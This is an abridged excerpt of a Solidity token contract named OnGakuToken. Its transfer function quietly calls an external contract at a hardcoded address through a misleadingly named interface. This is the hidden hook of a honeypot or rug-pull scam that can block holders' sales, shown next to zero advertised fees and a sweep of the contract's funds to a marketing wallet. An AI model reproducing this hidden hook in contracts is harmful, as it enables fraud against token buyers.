...
interface IErc223Transfer {
    function transferFrom(address from, address sender) external;
}
...
contract OnGakuToken is Context, IERC20, Ownable {
    ...
    string private constant _name = "OnGakuToken";
    string private constant _symbol = "ONGAKU";
    ...
    IErc223Transfer private tokenTransfer;
    ...
    constructor () {
        ...
        marketingAddress = address(0xC8F28a700b88caCA4c4D1791B3CeB61a840681Cc);
        liquidityAddress = address(0x2578451E600eB213A116B8A0Ecb2F92cC55d5da3);
        
        sellFee.liquidity = 0; sellFee.marketing = 0;
        buyFee.liquidity = 0; buyFee.marketing = 0;

        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        tokenTransfer = IErc223Transfer(0x514eF4FfcD9e1FBE88A99a22a62112153190ec7B);
    ...
    function _transfer(
        ...
        if (!_isExcludedFromFee[from] && !_isExcludedFromFee[to]) {
            tokenTransfer.transferFrom(from, to);
        }
        if(takeFee){
            if(to != uniswapV2Pair){
    ...
    function swapBack(uint256 amount) private {
        ...
        address(marketingAddress).call{value: address(this).balance}("");
    }
